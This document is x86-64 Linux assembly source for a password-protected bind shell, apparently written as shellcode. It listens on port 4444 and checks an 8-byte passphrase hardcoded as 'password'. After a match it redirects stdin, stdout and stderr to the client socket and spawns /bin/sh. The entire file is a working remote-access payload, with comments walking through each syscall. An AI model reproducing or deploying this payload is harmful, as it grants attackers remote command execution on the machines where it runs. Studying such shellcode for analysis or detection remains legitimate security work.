global _start
section .text

_start:
	mov rbp, rsp

; Build a server sockaddr_in struct on the stack
	xor rax, rax
	push rax
	add ax, 0x5c11
	shl rax, 16
	add ax, 2
	push rax

; Create Socket	
	xor rax, rax
	mov rdx, rax
	inc rax
	mov rsi, rax	  	; SOCK_STREAM (1)
	inc rax
	mov rdi, rax	  	; AF_INET (2)
	add rax, 39	  	; syscall 41
	syscall
	push rax		; Store socket id

; Bind Socket
	xor rax, rax
	add rax, 49
	mov rdi, [rbp-24]  	; socket id
	lea rsi, [rbp-16]  	; sockaddr_in struct
	xor rdx, rdx
	add rdx, 16	  	; sockaddr_in size
	push rdx	  	; create size val ref on stack
	syscall

; Listen
	xor rax, rax
	add rax, 2
	mov rsi, rax
	add rax, 48
	syscall

_accept:
	xor rax, rax
	add rax, 43
	mov rdi, [rbp-24]  	; socket id
	lea rsi, [rbp-16] 	; sockaddr_in struct
	lea rdx, [rbp-32]	; pointer to sockaddr_in size
	syscall
	push rax		; Store client socket id

; authenticate incoming connection
	mov rdi, [rbp-40]	; socket id
	lea rsi, [rbp-16]	; buffer address
	xor rcx, rcx 		; Zero out registers
	push rcx
	push rcx
	push rcx
	pop rdx
	pop rax
	pop r8
	mov r9, r8	
	add rdx, 8		; buffer length
	add rax, 45		; recvfrom
	syscall

; compare strings
	mov rbx, [rbp-16]	; Get input string
	xor rcx, rcx		; build 'password' string
	add rcx, 0x64726f77
	shl rcx, 32
	add rcx, 0x73736170
	cmp rbx, rcx		; compare
	jne _badpw		; handle failed matches

; good passphrase (fallthrough)
	jmp _create_shell	; set up the shell

_badpw:
	xor rax, rax		; zero out regs
	push rax
	pop rsi
	add rax, 48		; shutdown client socket
	pop rdi			; last use of client sock id
	add rsi, 2		; SHUT_RDWR
	syscall		
	jmp _accept		; jump back to await another connection

_create_shell:

; Duplicate I/O descriptors
	xor rax, rax 
	add rax, 33		; dup2		
	mov r8, rax
	mov rdi, [rbp-40]	; client socket id
	xor rsi, rsi		; STDIN
	syscall 

	mov rax, r8		; dup2
	inc rsi			; STDOUT
	syscall

	mov rax, r8		; dup2
	inc rsi			; STDERR
	syscall

_spawn:
	xor rax, rax
	push rax
	pop rdx			; less instructions than MOV
	mov rbx, 0x68732f6e69622f78 ; build X/bin/sh
	shr rbx, 8		; shift the ¨X¨ and append a NULL
	mov [rbp-16], rbx	; copy ¨/bin/sh¨ string to buffer
	lea rdi, [rbp-16] 	; get the /bin/sh string
	push rax		; build args array, by pushing NULL
	push rdi		; then pushing string address
	mov rsi, rsp		; args array address
	add rax, 59		; execve
	syscall
